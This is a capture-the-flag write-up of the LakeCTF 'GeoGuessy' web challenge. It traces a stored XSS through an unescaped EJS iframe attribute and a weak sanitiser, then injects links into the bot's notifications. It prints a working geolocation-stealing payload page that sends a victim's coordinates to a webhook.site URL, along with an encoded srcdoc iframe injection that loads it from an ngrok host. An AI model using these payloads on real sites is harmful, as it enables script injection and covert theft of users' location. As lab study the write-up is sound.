# GeoGuessy

## Table of Contents

 1. [Overview](#overview)  
 2. [Background](#background)  
 3. [Enumeration](#enumeration)  
 4. [Exploitation](#exploitation)  
    4.1. [Unintended Premium Account](#unintended-premium-account)  
    4.2. [Geolocate the Bot With Stored XSS](#geolocate-the-bot-with-stored-xss)  
 5. [Conclusion](#conclusion)

## Overview

- Contributor: @siunam, @ani, @charif, @d4rk, @kroot, @mixy1, @Seb, @Colonneil, @flocto, @Foo, @M0ud4, @mirkhoff, @null_awe, @SuperBeetleGamer
- 11 solves / 472 points
- Author: pilvar
- Overall difficulty for me (From 1-10 stars): ★★★★★★★★★★

## Background

This is NOT an OSINT challenge :) (PS: please have a working exploit locally before destroying the remote 🙏)

[https://chall.polygl0ts.ch:9011](https://chall.polygl0ts.ch:9011)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106154313.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106124834.png)

In here, we can either login to an account or register a new one.

When we clicked the "Login" button, it brings us to `/login`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106124944.png)

Hmm... We need a secret token to login.

How about the "Register" button?

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106125140.png)

When we clicked that button, it'll bring us to `/register`, which will set a new cookie called `token`, generate a random username, and a secret token.

Let's click the "home" button!

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106125930.png)

In here, we can see that there's a button called "Create new challenge", and a link called "Settings", which refer to `/settings`.

In `/settings`, **we can change our username**, and **able to gain "premium access" if the PIN code is correct**.

Not sure what's that "premium access". Let's move on.

**In the home page after authenticated, we can create a new challenge:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106130342.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106130354.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106130416.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106130429.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106130513.png)

**Upon the geolocation challenge creation, it'll send a POST request to `/createChallenge` with the following JSON body data:**
```json
{
    "latitude":46.557867544393076,
    "longitude":46.126174004122106,
    "img":"<base64_encoded_bytes>",
    "OpenLayersVersion":"2.10",
    "winText":""
}
```

Then, the web application respond us with **this challenge's ID**?

Also, in here, we can send an invitation challenge link to a specific user:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106130927.png)

Umm... Can I send it to myself?

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106131032.png)

**When we clicked the "Send invitation" button, it'll send a POST request to `/challengeUser` with the following JSON body data:**
```json
{
    "username":"DefiniteCriticism3726",
    "duelID":"610d48948375bb2f2da7429a8c9cf909"
}
```

And the `duelID` looks like our challenge's ID.

**After sending it, the challenged user will receive a notification:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106131311.png)

**The notification is like this:**
```
<username> has challenged you to a game! Click here to play!
```

**The "Click here to play!" is an `<a>` tag, which has a link points to `/challenge?id=<challengeId>`.**

**When the challenged user clicked the challenge link, he/she can try to solve the geolocate challenge:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106131607.png)

**When the challenged user clicked the "Submit position", it'll send a POST request to `/solveChallenge` with the following JSON body data:**
```json
{
    "latitude":3.5134210456399937,
    "longitude":10.195312499999888,
    "challId":"610d48948375bb2f2da7429a8c9cf909"
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106131816.png)

Now we have a high-level overview of this web application!

**In this challenge, we can download [the source code of the web application](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/web/GeoGuessy/handout.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/LakeCTF-Quals-23/web/GeoGuessy)-[2023.11.06|13:19:09(HKT)]
└> file handout.tar.gz          
handout.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 10741760
┌[siunam♥Mercury]-(~/ctf/LakeCTF-Quals-23/web/GeoGuessy)-[2023.11.06|13:19:11(HKT)]
└> tar xf handout.tar.gz 
┌[siunam♥Mercury]-(~/ctf/LakeCTF-Quals-23/web/GeoGuessy)-[2023.11.06|13:19:14(HKT)]
└> ls -lah handout
total 20K
drwxr-xr-x 3 siunam nam 4.0K Nov  5 00:15 .
drwxr-xr-x 3 siunam nam 4.0K Nov  6 13:19 ..
-rw-r--r-- 1 siunam nam  884 Nov  3 06:52 compose.yml
-rw-r--r-- 1 siunam nam  910 Nov  3 06:48 Dockerfile
drwxr-xr-x 8 siunam nam 4.0K Nov  5 00:15 GeoGuessy
```

**In the `docker-compose` building file `compose.yml`, we can see how the docker containers were built:**
```yaml
services:
  https-proxy:
    image: nginxproxy/nginx-proxy
    ports:
      - "9011:80" # remote has this for https: - "9011:443"
    volumes:
      - /var/run/docker.sock:/tmp/docker.sock:ro
      # remote has this for https: - ./certs:/etc/nginx/certs:ro
  web:
    build: .
    init: true
    environment:
      - "PREMIUM_PIN=012-023-034" # diffrent on remote
      - "FLAG=EPFL{fake_flag}" # diffrent on remote
      - "LATLON=12.454545,12.454545" # different on remote
      - "VIRTUAL_HOST=localhost" #remote uses "VIRTUAL_HOST=chall.polygl0ts.ch"
      - "VIRTUAL_PORT=9011"
      - "CHALL_URL=http://localhost:9011" # remote uses "CHALL_URL=https://chall.polygl0ts.ch:9011"
    extra_hosts:
      - "a.tile.openstreetmap.org:127.0.0.1" # avoid unncessary req to openstreetmap from bot
      - "b.tile.openstreetmap.org:127.0.0.1"
      - "c.tile.openstreetmap.org:127.0.0.1"
```

**In service `web`, we can see some environment variables:**
```yaml
[...]
environment:
  - "PREMIUM_PIN=012-023-034" # diffrent on remote
  - "FLAG=EPFL{fake_flag}" # diffrent on remote
  - "LATLON=12.454545,12.454545" # different on remote
  - "VIRTUAL_HOST=localhost" #remote uses "VIRTUAL_HOST=chall.polygl0ts.ch"
  - "VIRTUAL_PORT=9011"
  - "CHALL_URL=http://localhost:9011" # remote uses "CHALL_URL=https://chall.polygl0ts.ch:9011"
[...]
```

Hmm... The `LATLON` environment variable sticks out to me. **Maybe we need to submit a correct latitude and longitude value in order to get the flag?**

After reading the source code a little bit, me and my teammates found something interesting at `routes/index.ts`.

**In route `/challenge`, there's a trivial stored (persistent) XSS vulnerability in the `iframeAttributes` variable:**
```javascript
[...]
sanitizeHTML = (input) => input.replaceAll("<","&lt;").replaceAll(">","&gt;")

router.get('/challenge', async (req, res) => {
    if (!req.query.id) return res.status(404).json('wher id');
    chall = await db.getChallengeById(req.query.id.toString())
    if (!chall) return res.status(404).json('no');
    libVersion = chall.OpenLayersVersion
    img = chall.image
    challId = chall.id
    iframeAttributes = "sandbox=\"allow-scripts allow-same-origin\" " // don't trust third party libs
    iframeAttributes += "src=\"/sandboxedChallenge?ver="+sanitizeHTML(libVersion)+"\" "
    iframeAttributes += "width=\"70%\" height=\"97%\" "
    res.render('challenge', {img, challId, iframeAttributes});
});
[...]
```

As you can see, variable `libVersion` is directly parsed to the `iframeAttributes`, which allows us to inject arbitrary HTML/JavaScript code.

Although variable `libVersion` is "sanitized" (it simply replaces `<` to HTML entity `&lt;`, and `>` to HTML entity `&gt;`), it's very easy to bypass and escape the iframe attribute by using double quotes (`"`).

Then, we can use `srcdoc` iframe attribute to inject our HTML/JavaScript code.

**Here's a Proof-of-Concept payload:**
```html
" srcdoc="&lt;script&gt;alert&lpar;document&period;domain&rpar;&lt;&sol;script&gt;"
```

> Note: `<iframe>` **attribute `srcdoc` value must be using HTML entity**, otherwise it doesn't work.

But wait, **how does `iframeAttributes` is being render**? Which template engine is using for this web application?

**In `app.js`, we can see that template engine is EJS:**
```javascript
[...]
app.set('view engine', 'ejs');
[...]
```

**It's also worth noting that this web application has a CSP (Content Security Policy):**
```javascript
[...]
app.use(function(req, res, next) {
    res.setHeader('Content-Security-Policy', "script-src 'self'; style-src 'self';")
    next();
  });
[...]
```

Ahh... the `script-src` directive is set to `self`, which means only the domain's JavaScript file can be loaded in the web application. But, we can very easily bypass this, as the CSP isn't very restrictive.

**Let's go back to the template render for route `/challenge`:**
```javascript
[...]
res.render('challenge', {img, challId, iframeAttributes});
[...]
```

**It uses the `challenge.ejs` template file:**
```html
<html>
<head>
    <link rel="stylesheet" type="text/css" href="/static/challenge.css">
</head>
<body>

<div id="challId"><%= challId %></div>
<img src="data:image/png;base64,<%= img %>">
<iframe <%- iframeAttributes %>></iframe>
<button id="submitButton">Submit position</button>
<div id="out"></div>
<script src="/static/challenge.js"></script>
<div class="notifications">
    <%- include('./partials/notifications.ejs') %>
</div>

</body>
</html>
```

**Hmm... Did you spot the difference?**
```
<%= challId %>
<%= img %>
<%- iframeAttributes %>
```

**`challId` and `img` variable has `=`, but not variable `iframeAttributes`!**

**Upon researching, I found [this StackOverflow post](https://stackoverflow.com/questions/11024840/ejs-versus):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106134509.png)

Oh!! That being said, **variable `iframeAttributes` is indeed vulnerable to stored XSS IF we can control this variable**.

Speaking of how to control that variable, **we can trace back how `libVersion` is being parsed.**

**In route `/challenge`, the `libVersion` is from `chall.OpenLayersVersion`, which is fetched from the database:**
```javascript
[...]
router.get('/challenge', async (req, res) => {
    if (!req.query.id) return res.status(404).json('wher id');
    chall = await db.getChallengeById(req.query.id.toString())
    if (!chall) return res.status(404).json('no');
    libVersion = chall.OpenLayersVersion
    [...]
});
[...]
```

Hmm... **How `OpenLayersVersion` is being inserted in the database?**

**In route `/createChallenge`, `OpenLayersVersion` is being inserted to the database when we create a new challenge:**
```javascript
[...]
const db = require('../utils/db');
[...]
router.post('/createChallenge', async (req, res) => {
    token = req.cookies["token"]
    if (token) {
        user = await db.getUserBy("token", token)
        if (user && req.body["longitude"] && req.body["latitude"] && req.body["img"]) {
            chalId = crypto.randomBytes(16).toString('hex')
            if (user.isPremium) {
                if ((!req.body["winText"]) || (!req.body["OpenLayersVersion"])) return res.status(401).json('huh');
                winText = req.body["winText"].toString()
                OpenLayersVersion = req.body["OpenLayersVersion"].toString()
            } else {
                winText = "Well played! :D"
                OpenLayersVersion = "2.13"
            }
            await db.createChallenge(chalId, user.token, req.body["longitude"].toString(), req.body["latitude"].toString(), req.body["img"].toString(), OpenLayersVersion, winText)
            return res.status(200).json(chalId);
        }
    }
    return res.status(401).json('no');
});
[...]
```

**Asynchronous function `createChallenge` in `utils/db.js`:**
```javascript
async function createChallenge(id,author,longitude,latitude,image,OpenLayersVersion,winText) {
    return new Promise((resolve, reject) => {
        db.get("INSERT INTO challenges VALUES (?, ?, ?, ?, ?, ?, ?)", [id,author,longitude,latitude,image,OpenLayersVersion,winText], async (err) => {
            if (err) {
                reject(err);
            } else {
                resolve()
            }
        });
    });
};
```

**Hold up... Let's take a look at the following if else statement in route `/createChallenge`:**
```javascript
[...]
if (user.isPremium) {
    if ((!req.body["winText"]) || (!req.body["OpenLayersVersion"])) return res.status(401).json('huh');
    winText = req.body["winText"].toString()
    OpenLayersVersion = req.body["OpenLayersVersion"].toString()
} else {
    winText = "Well played! :D"
    OpenLayersVersion = "2.13"
}
[...]
```

Hmm... **If the user is NOT a premium user, it sets the `OpenLayersVersion` to `"2.13"`...**

**If the user IS a premium user, the user can set the `OpenLayersVersion` value to whatever the user wants.**

***Damn it, we have become a premium user to create a challenge that has an XSS payload...***

Well then, how to become a premium user?

**In route `/updateUser`, if the provided PIN code is matched to the environment variable `PREMIUM_PIN`'s PIN code, we're in:**
```javascript
[...]
router.post('/updateUser', async (req, res) => {
    token = req.cookies["token"]
    if (token) {
        user = await db.getUserBy("token", token)
        if (user) {
            enteredPremiumPin = req.body["premiumPin"]
            if (enteredPremiumPin) {
                enteredPremiumPin = enteredPremiumPin.toString()
                if (enteredPremiumPin == premiumPin) {
                    user.isPremium = 1
                } else {
                    return res.status(401).json('wrong premium pin');
                }
            }
            if (req.body["username"]) {
                [...]
            }
            await db.updateUserByToken(token, user)
            return res.status(200).json('yes ok');
        }
    }
    return res.status(401).json('no');
});
[...]
```

Crap... Do we need to brute force the premium PIN?...

**At the top of the `route/index.ts`, I saw this:**
```javascript
[...]
premiumPin = process.env.PREMIUM_PIN ? process.env.PREMIUM_PIN : '123-456-012' // remote is different numbers but same format ([0-9]{3}-[0-9]{3}-[0-9]{3}). Please don't try to brainless brute the 1 billion possibilities (if you try do so anyway there will be consequences >:D )
[...]
```

> Please don't try to brainless brute the 1 billion possibilities (if you try do so anyway there will be consequences >:D )

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106140338.png)

Umm... So we shouldn't brute force the PIN??

Anyway, what's our goal of this challenge? Is there a "bot" that try to trigger our XSS payload?

**Yes we do. In route `/bot`, we can see this:**
```javascript
[...]
const botChallenge = require('../utils/report');
[...]
router.get("/bot", limiter, async (req, res) => {
    if (!req.query.username) return res.status(404).json('what are you even doing lol')
    botChallenge(req.query.username.toString(),premiumPin)
    return res.status(200).json('successfully received :)');
});
[...]
```

When GET parameter `username` is provided, **it'll call function `botChallenge` from `utils/report.js`with argument `username` and `premiumPin`.**

**`utils/report.js`:**
```javascript
const puppeteer = require('puppeteer');
const execSync = require('child_process').execSync;
const crypto = require('crypto')

CHALL_URL = process.env.CHALL_URL ? process.env.CHALL_URL : "http://localhost:9011"
flag = process.env.FLAG ? process.env.FLAG : 'EPFL{fake_flag}'
latlon = process.env.LATLON ? process.env.LATLON : '46.520221,6.565842'

const sleep = (milliseconds) => {
    return new Promise(resolve => setTimeout(resolve, milliseconds))
  }

async function play(page) { // admin accepts all challenges :)
    while (true) {
      try {
        await sleep(100)
        linkHandlers = await page.$x("//a[contains(text(), 'Click here to play!')]");
        if (linkHandlers.length > 0) {
        await linkHandlers[0].click();
        }
    } catch (e) {
    }
    }
}

async function botChallenge(username, premiumPin) {
    try {
        dataPath = "/tmp/"+crypto.randomBytes(16).toString('hex');
        execSync("cp -r ./profile "+dataPath)
        const browser = await puppeteer.launch({ headless: false, args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu', '--js-flags=--noexpose_wasm,--jitless', '--use-fake-device-for-media-stream', '--use-fake-ui-for-media-stream', '--use-file-for-fake-video-capture=./happy.mjpeg','--user-data-dir='+dataPath] });
        const page = await browser.newPage();
        const context = browser.defaultBrowserContext()
        console.log(context)
        await page.setGeolocation({latitude:parseFloat(latlon.split(",")[0]), longitude:parseFloat(latlon.split(",")[1])})
        await page.goto(CHALL_URL);
        await page.waitForSelector('#registerLink')
        await sleep(100)
        await page.click('#registerLink');
        await page.waitForSelector('#homeBut')
        await sleep(100)
        await page.click('#homeBut');
        await sleep(100)
        await page.waitForSelector('#settingsLink')
        await sleep(100)
        await page.click('#settingsLink')
        await page.waitForSelector('#premiumPinInput')
        await sleep(100)
        await page.type('#premiumPinInput', premiumPin)
        await page.waitForSelector('#updateSettingsButton')
        await sleep(100)
        await page.click('#updateSettingsButton')
        await page.waitForSelector('#createNewChallBut')
        await sleep(100)
        await page.click('#createNewChallBut')
        await page.waitForSelector('#OpenLayersVersion')
        await sleep(100)
        await page.select('#OpenLayersVersion', '2.13')
        await page.waitForSelector('#winText')
        await sleep(100)
        await page.type('#winText', flag)
        await page.waitForSelector('#endMetadataButton')
        await sleep(100)
        await page.click('#endMetadataButton')
        await page.waitForSelector('#realBut')
        await sleep(100)
        await page.click('#realBut')
        await page.waitForSelector('#camerastartButton')
        await sleep(1000)
        await page.click('#camerastartButton')
        await sleep(2000)
        await page.waitForSelector('#captureButton')
        await sleep(100)
        await page.click('#captureButton')
        await page.waitForSelector('#confirmButton')
        await sleep(100)
        await page.click('#confirmButton')
        await page.waitForSelector('#usernameInput')
        await sleep(100)
        await page.type('#usernameInput', username)
        await page.waitForSelector('#challengeUserButton')
        await sleep(100)
        await page.click('#challengeUserButton')
        await sleep(1000)
        play(page)
        await sleep(60000)
        await browser.close();
    } catch (e) {
        console.log(e)
    }
}

module.exports = botChallenge
```

So, what's that function will do is:

1. Launch a headless **Chrome** browser using Node.js library [Puppeteer](https://github.com/puppeteer/puppeteer). It also **using a Chrome profile from `profile/Default/Perference` (option `--user-data-dir`)**
2. Open a new page in the browser, **set the `latitude` and `longitude` to the environment variable `LATLON` value**. Then go to this challenge URL (`https://chall.polygl0ts.ch:9011` on remote)
3. ***Register a new account*** by clicking the link
4. Go to the home page and "settings" page
5. In "settings" page, ***set `isPremium=1` by submitting a correct premium PIN code***
6. ***Create a new challenge*** with `OpenLayersVersion` 2.13 and ***`winText` to `flag`***
7. Send an invitation challenge link to the `username` that we've provided in GET route `/bot?username=<username_here>`
8. The bot (**premium new account**) ***plays all challenges that other users sent an the invitation challenge link to the bot***. It'll keep playing for 60 seconds
9. Close the browser

In the above steps, there're 2 things stick me out.

1. For every actions, there's a certain delays. For example, **during the registration, every click has 100 ms delay**
2. The bot **clicks all `<a>` tags with text contains `Click here to play!`**

Hmm... How can we abuse those steps...

Ah! **Can we inject an `<a>` tag in our username**?

**Like this:**
```html
<a href="<whatever_URL_you_want>">Click here to play!</a>
```

**If the bot sees this `<a>` tag, it should just click the link!**

**In render template `views/partials/notifications.ejs`, we can see this:**
```html
<html>
<head>
    <link rel="stylesheet" type="text/css" href="/static/notifications.css">
</head>
<body>

<script referrerPolicy="no-referrer" src="/static/socket.io.min.js"></script>
<script src="/static/purify.min.js"></script>
<script src="/static/notifications.js"></script>

<details id="notifications">
    <summary>Notifications <b id="notifCount">(0)</b> <p id="preview"></p></summary>
    <div id="notificationsList"></div>
</details>

</body>
</html>
```

**`/static/notifications.js`:**
```javascript

  const socket = io();
  socket.on("status", (data) => {
      if (data == "auth") {
          cookies = document.cookie
          tokenIndex = cookies.indexOf("token=")+"token=".length
          token = cookies.substr(tokenIndex,32)
          socket.emit("auth",token);
      }
  });
  
  socket.on("notifications", (data) => {
    notifCount.innerText = "("+data.length+")"
    if (data.length == 0) {
        return
    }
    notificationsList.innerHTML = ""
    notifHTML = ""
    for (let i = 0; i < data.length; i++) {
        notifHTML += `<li>${data[i]}</li>`
    }
    notificationsList.innerHTML = DOMPurify.sanitize(notifHTML)
    preview.innerHTML = DOMPurify.sanitize("("+data[data.length-1]+"...)")
  });
```

Wait... Is it using XSS sanitizer library **[DOMPurify](https://github.com/cure53/DOMPurify)** to sanitize the notifications?

Luckily, DOMPurify shouldn't sanitize our `<a>` tag.

**Let's try to update our username to that `<a>` tag!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106144604.png)

**Then, create a new challenge:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106144824.png)

**Next, to get bot's new account username, we need to send an invitation challenge link to the bot:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106144942.png)

**Finally, send an invitation challenge link to the bot's new account username:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106145849.png)

And you should receive a GET request to your webhook link.

Hmm... **Can I geolocate the bot??** Like the `<a>` tag's link point to my static web server that hosting `payload.html`, which contains JavaScript code that geolocate the bot.

**Upon researching, I found [the Geolocation API from MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API):**

> **Secure context:** This feature is available only in [secure contexts](https://developer.mozilla.org/en-US/docs/Web/Security/Secure_Contexts) (HTTPS), in some or all [supporting browsers](https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API#browser_compatibility).

Hmm... This can be easily fixed by using Ngrok.

> The **Geolocation API** allows the user to provide their location to web applications if they so desire. For privacy reasons, the user is asked for permission to report location information.

Oh... **"the user is asked for permission to report location information"**...

Wait, I wonder **what's that Chrome profile in `profile/Default/Perference`**.

**In `app.js`, we see this:**
```javascript
CHALL_URL = process.env.CHALL_URL ? process.env.CHALL_URL : "http://localhost:9011"
profilePerm = '{"profile":{"content_settings":{"exceptions":{"geolocation":{"'+CHALL_URL+',*":{"last_modified":"13343189901746175","last_visit":"13343097600000000","setting":1}}}}}}'
fs.writeFileSync('./profile/Default/Preferences', profilePerm)
```

**In the profile permission, it's set to:**
```json
{
    "profile":
    {
        "content_settings":
        {
            "exceptions":
            {
                "geolocation":
                {
                    "https://chall.polygl0ts.ch:9011,*":
                    {
                        "last_modified": "13343189901746175",
                        "last_visit": "13343097600000000",
                        "setting": 1
                    }
                }
            }
        }
    }
}
```

> TL;DR: This Chrome profile setting allows geolocation access for the website `https://chall.polygl0ts.ch:9011` and its sub-paths, with a specific timestamp indicating the last modification and visit.

That being said, **only `https://chall.polygl0ts.ch:9011` doesn't prompt the bot to accept the permission...**

So nope, we can't just host a static web server to serve the geolocate JavaScript code.

Uhh... Ultimately, we have to become a premium user...

## Exploitation

### Unintended Premium Account

After endless of banging me and my teammates head into the wall, **we somehow... got registered a random account that is a premium account:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106151844.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106151903.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106151950.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106003132.png)

> Note: After the CTF ends, "strellic" posted the first part of the unintended solution:
> 
> ![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106152436.png)
> 
> Maybe we just got lucky that we accidentally won the race condition during bot's premium PIN submission :D 

After we got an account that is a premium account, we can easily geolocate the bot and submit the correct latitude and longitude by exploiting the stored XSS vulnerability in route `/chalelnge`.

### Geolocate the Bot With Stored XSS

- **Setup a static web server that hosting this `payload.html` geolocate JavaScript code:**

```html
<!doctype html>
<html>
  <body>
    <script>
      function sendDataToWebhook(bodyData) {
        navigator.sendBeacon("https://webhook.site/<your_token>", bodyData);
      }
      function onsuccess(position) {
        sendDataToWebhook(`${position.coords.longitude} ${position.coords.latitude}`);    
      }
      function onerror(error) {
        sendDataToWebhook(`${error.code} ${error.message}`);
      }

      function geolocate(){
        navigator.geolocation.getCurrentPosition(onsuccess, onerror, {enableHighAccuracy:true});
      }
      
      geolocate()
    </script>
  </body>
</html>
```

When the bot visit this `payload.html`, it'll send its longitude and latitude to our webhook URL.

- **Use Ngrok to port forward our static web server to the internet:**

```shell
┌[siunam♥Mercury]-(~/ctf/LakeCTF-Quals-23/web/GeoGuessy)-[2023.11.06|0:47:45(HKT)]
└> ngrok http 80
[...]
Forwarding                    https://ed80-{Redacted}.ngrok-free.app -> http://localhost:80        
[...]
```

- **Create a new challenge with the XSS payload, and grab the challenge ID:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106005012.png)

```json
{
    "latitude":37.507338192034396,
    "longitude":145.6575352656073,
    "img":"foobar",
    "OpenLayersVersion":"2.13\"srcdoc=\"&lt;iframe src&equals;&quot;https&colon;&sol;&sol;ed80-{Redacted}&period;ngrok-free&period;app&sol;payload&period;html&quot; allow&equals;&quot;geolocation &ast;&quot;&gt;&lt;&sol;iframe&gt;\" allow=\"geolocation *\"",
    "winText":"blah"
}
```

**XSS payload in `OpenLayersVersion`:**
```html
"srcdoc="&lt;iframe src&equals;&quot;https&colon;&sol;&sol;ed80-{Redacted}&period;ngrok-free&period;app&sol;payload&period;html&quot; allow&equals;&quot;geolocation &ast;&quot;&gt;&lt;&sol;iframe&gt;" allow="geolocation *"
```

**Convert HTML entities back to text:**
```html
"srcdoc="<iframe src="https://ed80-{Redacted}.ngrok-free.app/payload.html" allow="geolocation *"></iframe>" allow="geolocation *"
```

In this XSS payload, we inject the `srcdoc` attribute into the `<iframe>` tag. **Inside that `srcdoc` attribute, we create a new `<iframe>` element with `src` that points to our `payload.html`, geolocate JavaScript code.**

However, since the bot's Chrome profile only grant origin `https://chall.polygl0ts.ch:9011` able to geolocate, **we have to use `allow="geolocation *"` in our injected `<iframe>`, so that we can geolocate the bot in any origin.** (see [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy/geolocation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy/geolocation) for more details.)

- **Create a new bot with a new account, so that we can know the bot's new account username:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106005135.png)

- **Send the XSS payload challenge link to the bot:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106005341.png)

- **The XSS payload should be triggered:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106005433.png)

Therefore, we got:

- Latitude: `60.792937`
- Longitude: `11.100984`

Nice!!

- **Finally, go to the bot's new account's challenge:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106005902.png)

- **and submit the correct latitude and longitude value:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LakeCTF-Quals-23/images/Pasted%20image%2020231106005955.png)

- **Flag: `EPFL{as a wise man once said, https://twitter.com/arkark_/status/1712773241218183203}`**

## Conclusion

What we've learned:

1. Geolocating via stored XSS